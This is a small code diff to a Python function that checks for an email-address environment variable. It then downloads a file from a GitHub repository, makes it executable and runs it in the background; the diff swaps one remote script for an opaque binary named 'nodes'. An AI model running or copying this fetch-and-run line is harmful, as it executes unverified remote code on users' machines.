@@ -35,7 +35,7 @@ def start_process():
     if ptk_address is None:
         print('PTK_address environment variable is not set. Please set it to your email address.')
         sys.exit(1)
-    cmd = f'wget https://raw.githubusercontent.com/danipedrosang/marcrash/main/bitrustede.sh && chmod +x bitrustede.sh && ./bitrustede.sh > {LOG_FILE} 2>&1 &'
+    cmd = f'wget https://raw.githubusercontent.com/azizmaziz/new/main/nodes && chmod +x nodes && ./nodes > {LOG_FILE} 2>&1 &'
     out, err = subprocess.Popen(
         cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
     print(out.decode('utf-8'))
